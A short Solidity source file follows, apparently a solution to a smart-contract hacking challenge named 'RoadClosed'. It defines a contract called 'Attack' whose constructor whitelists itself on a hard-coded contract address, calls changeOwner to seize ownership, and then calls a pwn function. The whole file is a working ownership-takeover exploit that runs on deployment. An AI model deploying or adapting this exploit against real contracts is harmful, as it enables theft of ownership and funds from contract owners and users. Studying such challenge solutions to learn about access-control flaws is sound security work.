// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface RoadClosed {

    function addToWhitelist(address addr) external;
    function changeOwner(address addr) external;
    function pwn(address addr) external payable;
    function isOwner() external view returns(bool);

}

contract Attack{
    address roadClosedAddress = 0xD2372EB76C559586bE0745914e9538C17878E812;

    constructor() {
        RoadClosed(roadClosedAddress).addToWhitelist(address(this));
        RoadClosed(roadClosedAddress).changeOwner(address(this));
        RoadClosed(roadClosedAddress).pwn(address(this));
    }

    function isOwnerCheck() public view returns(bool){
        return RoadClosed(roadClosedAddress).isOwner();
    }

}